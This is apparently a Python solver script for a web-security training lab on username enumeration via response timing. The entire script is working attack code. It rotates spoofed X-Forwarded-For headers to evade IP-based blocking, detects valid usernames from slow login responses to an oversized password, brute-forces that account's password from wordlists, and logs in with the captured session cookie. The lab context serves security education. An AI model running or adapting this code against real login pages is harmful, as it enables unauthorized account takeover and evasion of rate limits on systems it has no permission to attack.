import requests
import urllib3
import re
import random
import time
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Username enumeration via response timing"
SCRIPT_START_TIME = time.time()


def read_list(files_path):
    try:
        return open(files_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "[!] Failed to open the file " + files_path)
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "Elapsed: " + Fore.YELLOW + str(elapsed) +
          Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "\n[+] Finished in: " +
          Fore.YELLOW + str(elapsed) + Fore.WHITE + " seconds")


def get_random_ip():
    a = random.randint(2, 254)
    b = random.randint(2, 254)
    c = random.randint(2, 254)
    d = random.randint(2, 254)
    return f"{a}.{b}.{c}.{d}"


def login(session, username, password, url):
    headers = {"X-Forwarded-For": get_random_ip()}
    data = {"username": username, "password": password}
    try:
        return session.post(f"{url}/login", data=data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + f"\n[!] Failed to login as {username}")
        return None


def try_to_find_valid_username(session, usernames_list, url):
    big_password = "midomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomidomido"

    for counter, user in enumerate(usernames_list):
        print_progress(counter, len(usernames_list), user)
        response = login(session, user, big_password, url)
        if response and response.status_code == 200 and response.elapsed.total_seconds() > 2.5:
            return user

    print(Fore.RED + "\n[!] No valid username was found")
    exit(1)


def brute_force_password(session, valid_user, passwords, url):
    for (counter, password) in enumerate(passwords):
        print_progress(counter, len(passwords), password)
        response = login(session, valid_user, password, url)
        if response and response.status_code == 302:
            session_cookie = response.cookies.get("session")
            if session_cookie:
                session.cookies.set("session", session_cookie)
                return password

    print(Fore.RED + "\n[!] No valid password was found")
    exit(1)


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Read usernames and passwords lists\n2. Change X-Forwarded-For header to a random IP in every request to bypass blocking\n3. Try to find a valid username via response timing\n4. Brute force the password of that valid username\n5. Login with the valid credentials\n""")

    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print(Fore.WHITE + "[1] Reading usernames list..")
    usernames_list = read_list("usernames.txt")
    print(Fore.GREEN + "usernames stored")

    print(Fore.WHITE + "[2] Reading password list..")
    password_list = read_list("passwords.txt")
    print(Fore.GREEN + "passwords stored")

    print(Fore.WHITE + "[3] Finding valid username")
    valid_user = try_to_find_valid_username(session, usernames_list, url)
    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)

    print(Fore.WHITE + "[4] Brute forcing password..")
    valid_password = brute_force_password(
        session, valid_user, password_list, url)

    print(Fore.WHITE + "\nValid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "[5] Logging in.. ")
    print(Fore.WHITE + "[*] Refresh the page if lab is not showing solved.")

    try:
        r = session.get(f"{url}/my-account", allow_redirects=False)
        if "Your username is: " in r.text:
            print_finish_message()
            return True
        else:
            print(Fore.RED + "Login session failed.")
            return False
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False
